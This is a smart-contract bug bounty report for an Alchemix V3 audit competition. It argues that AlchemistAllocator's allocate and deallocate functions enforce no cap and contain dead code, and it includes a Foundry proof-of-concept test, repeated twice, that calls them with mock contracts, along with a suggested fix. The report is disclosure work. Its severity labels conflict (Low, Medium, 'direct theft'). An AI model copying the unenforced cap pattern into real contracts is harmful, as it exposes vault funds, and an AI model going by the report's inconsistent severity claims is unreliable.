# 57316 sc low allocation cap enforcement missing deadcode

## #57316 \[SC-Low] Allocation Cap Enforcement Missing & DeadCode

**Submitted on Oct 25th 2025 at 07:26:17 UTC by @Aiden for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57316
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistAllocator.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## Smart Contract Vulnerability Report

**Alchemix V3**:

### Vulnerability Title

Allocation Cap Enforcement Missing & DeadCode

### 🗂 Report Type

Smart Contract

### Target

* <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistAllocator.sol>

### Asset

AlchemistAllocator.sol

### 🚨 Rating

Severity: Medium

Impact: Medium

### Description

These two issues below exist in both functions : `allocate()` , `deallocate()`:

1: `Allocation Cap Enforcement Missing`:

Because `daoTarget` is set to the maximum `uint256` value, no real limit is enforced on fund allocation or withdrawal.

Consequences:

In the `allocate` function, an operator can allocate funds to a strategy more or less than the correct amount(cap).

In the `deallocate` function, an operator can deallocate funds to a strategy more or less than the correct amount(cap).

This means there is no effective control over the amount allocated or deallocated, creating a security risk

why !

here is important :

```solidity
function allocate(address adapter, uint256 amount) external {
    require(msg.sender == admin || operators[msg.sender], "PD");
    bytes32 id = IMYTStrategy(adapter).adapterId();

    //📌 Get the allowed cap
    uint256 absoluteCap = vault.absoluteCap(id); 
    //📌Get another cap
    uint256 relativeCap = vault.relativeCap(id); 

    uint256 daoTarget = type(uint256).max;
    uint256 adjusted = absoluteCap > relativeCap ? absoluteCap : relativeCap; 
    //📌 The value is assigned to `adjusted` here

    //📌 From this point, the problem starts
    if (msg.sender != admin) {
        // 📌Because in this line `adjusted` will always equal `daoTarget`
        // 📌Since `daoTarget` is the maximum uint256 value, `adjusted` will always be set to this maximum
        //📌 This effectively makes any cap meaningless
        adjusted = adjusted > daoTarget ? adjusted : daoTarget; 
        //📌 In other words, `adjusted` becomes equal to `daoTarget`
        //📌 So the previous comparison above is essentially useless, 
        // 📌and `adjusted` will always be the maximum uint256 value
    }

    bytes memory oldAllocation = abi.encode(vault.allocation(id));
    vault.allocate(adapter, oldAllocation, amount);
}


```

2: `Dead Code`:

`daoTarget` is set to the maximum possible `uint256` value. `uint256 daoTarget = type(uint256).max;` And the two lines below it appear::`adjusted = adjusted > daoTarget ? adjusted : daoTarget;` This means always results in `adjusted = daoTarget`, because daoTarget is the maximum uint256 value.\
This line is considered Dead Code.

### impact

* Over-allocation of assets
* Vault / DAO → Risk to funds and violation of Vault/DAO policies

### Vulnerability Details

These two functions below:

As can be seen , there is no restriction on the amount of funds that can be allocated or deallocated to the strategies within these functions.\
This is because daoTarget is set to the maximum uint256 value, effectively removing any enforcement of caps.

```solidity

    function allocate(address adapter, uint256 amount) external {
        require(msg.sender == admin || operators[msg.sender], "PD");
        bytes32 id = IMYTStrategy(adapter).adapterId();
        uint256 absoluteCap = vault.absoluteCap(id); 
        uint256 relativeCap = vault.relativeCap(id);
        uint256 daoTarget = type(uint256).max;
        uint256 adjusted = absoluteCap > relativeCap ? absoluteCap : relativeCap;
        if (msg.sender != admin) {
            adjusted = adjusted > daoTarget ? adjusted : daoTarget;
        }
        bytes memory oldAllocation = abi.encode(vault.allocation(id));
        vault.allocate(adapter, oldAllocation, amount);
    }


    function deallocate(address adapter, uint256 amount) external {
        require(msg.sender == admin || operators[msg.sender], "PD");
        bytes32 id = IMYTStrategy(adapter).adapterId();
        uint256 absoluteCap = vault.absoluteCap(id);
        uint256 relativeCap = vault.relativeCap(id);
        uint256 daoTarget = type(uint256).max;
        uint256 adjusted = absoluteCap < relativeCap ? absoluteCap : relativeCap;
        if (msg.sender != admin) {
            adjusted = adjusted < daoTarget ? adjusted : daoTarget;
        }
        bytes memory oldAllocation = abi.encode(vault.allocation(id));
        vault.deallocate(adapter, oldAllocation, amount);
    }
```

### Proof of Concept (PoC)

Step by Step here :

Full POC 👉🏽 download and run in github link :👇🏽

`https://github.com/AidenNabavi/Alchemix`

```

// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/AlchemistAllocator.sol";


// Mock adapter contract needed as input for allocate and deallocate functions
contract MockAdapter {
    function adapterId() external pure returns (bytes32) {
        return bytes32(uint256(1)); // just a dummy ID
    }
}


// Mock Vault contract for simulation
contract MockVault {
    address public assetAddr = address(0xDEAD);

    function asset() external view returns (address) {
        return assetAddr;
    }

    // Other functions for simulation
    function absoluteCap(bytes32) external pure returns (uint256) { return 1000; }
    function relativeCap(bytes32) external pure returns (uint256) { return 1000; }
    function allocation(bytes32) external pure returns (uint256) { return 0; }
    function allocate(address, bytes memory, uint256) external pure {}
    function deallocate(address, bytes memory, uint256) external pure {}
}



// Test contract for allocate and deallocate functions
contract AlchemistCuratorPoC is Test {
    AlchemistAllocator alchemistallocator;
    MockVault vault;
    MockAdapter adapter;
    address admin = address(0x001);
    address operator = address(0x002);

    function setUp() public {
        vault = new MockVault();
        alchemistallocator = new AlchemistAllocator(address(vault), admin, operator);
        adapter = new MockAdapter();
    }

    // This test demonstrates that the allocate and deallocate functions
    // can be called with any amount of funds.
    // It also shows that operators can allocate or deallocate funds
    // to strategies without any enforced limit.
    function testOperatorCanAllocateDeallocateWithoutLimit() public {

        uint256 cap_amount = 1000; // hypothetical allowed amount for operators

        vm.startPrank(operator); // simulate calls from operator

        // for allocate() function
        // Because daoTarget = uint256.max, no limit is enforced:
        // This very large allocation executes without revert.
        alchemistallocator.allocate(address(adapter), 10000000000000000000 ether);
        //again with diffrente value
        alchemistallocator.allocate(address(adapter), cap_amount + 1);



        // Similarly for deallocate() function 
        alchemistallocator.deallocate(address(adapter), 100000000000000000 ether);
        //again with diffrente value
        alchemistallocator.deallocate(address(adapter), cap_amount + 10);
        vm.stopPrank();
        console.log("This means The operator can send any arbitrary amount, even far exceeding the absoluteCap.");
    }
}


```

### How to fix it

(Recommended)

1: `Allocation Cap Enforcement Missing`:

A trusted source means a contract such as `StrategyClassificationProxy` that is controlled and configurable only by the DAO.

function allocate(address adapter, uint256 amount) external { require(msg.sender == admin || operators\[msg.sender], "PD"); bytes32 id = IMYTStrategy(adapter).adapterId();

```
uint256 absoluteCap = vault.absoluteCap(id);
uint256 relativeCap = vault.relativeCap(id);

// 📌 take daoTarget from the classification proxy (set by DAO)
uint256 daoTarget = strategyClassificationProxy.getDaoCap(id);

// effective cap is the strictest one
uint256 adjusted = _min3(absoluteCap, relativeCap, daoTarget);

// enforce for operators (admin may be allowed to bypass)
if (msg.sender != admin) {
    require(amount <= adjusted, "Allocation exceeds DAO target cap");
}

bytes memory oldAllocation = abi.encode(vault.allocation(id));
vault.allocate(adapter, oldAllocation, amount);
```

}

2: `Dead Code`:

replace`adjusted = adjusted > daoTarget ? adjusted : daoTarget;` with `adjusted = daoTarget`

### 🔗 References

* <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistAllocator.sol>

### Link to Proof of Concept

<https://github.com/AidenNabavi/Alchemix>

### Proof of Concept

Step by Step here :

Full POC 👉🏽 download and run in github link :👇🏽

`https://github.com/AidenNabavi/Alchemix`

```

// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/AlchemistAllocator.sol";


// Mock adapter contract needed as input for allocate and deallocate functions
contract MockAdapter {
    function adapterId() external pure returns (bytes32) {
        return bytes32(uint256(1)); // just a dummy ID
    }
}


// Mock Vault contract for simulation
contract MockVault {
    address public assetAddr = address(0xDEAD);

    function asset() external view returns (address) {
        return assetAddr;
    }

    // Other functions for simulation
    function absoluteCap(bytes32) external pure returns (uint256) { return 1000; }
    function relativeCap(bytes32) external pure returns (uint256) { return 1000; }
    function allocation(bytes32) external pure returns (uint256) { return 0; }
    function allocate(address, bytes memory, uint256) external pure {}
    function deallocate(address, bytes memory, uint256) external pure {}
}



// Test contract for allocate and deallocate functions
contract AlchemistCuratorPoC is Test {
    AlchemistAllocator alchemistallocator;
    MockVault vault;
    MockAdapter adapter;
    address admin = address(0x001);
    address operator = address(0x002);

    function setUp() public {
        vault = new MockVault();
        alchemistallocator = new AlchemistAllocator(address(vault), admin, operator);
        adapter = new MockAdapter();
    }

    // This test demonstrates that the allocate and deallocate functions
    // can be called with any amount of funds.
    // It also shows that operators can allocate or deallocate funds
    // to strategies without any enforced limit.
    function testOperatorCanAllocateDeallocateWithoutLimit() public {

        uint256 cap_amount = 1000; // hypothetical allowed amount for operators

        vm.startPrank(operator); // simulate calls from operator

        // for allocate() function
        // Because daoTarget = uint256.max, no limit is enforced:
        // This very large allocation executes without revert.
        alchemistallocator.allocate(address(adapter), 10000000000000000000 ether);
        //again with diffrente value
        alchemistallocator.allocate(address(adapter), cap_amount + 1);



        // Similarly for deallocate() function 
        alchemistallocator.deallocate(address(adapter), 100000000000000000 ether);
        //again with diffrente value
        alchemistallocator.deallocate(address(adapter), cap_amount + 10);
        vm.stopPrank();
        console.log("This means The operator can send any arbitrary amount, even far exceeding the absoluteCap.");
    }
}


```
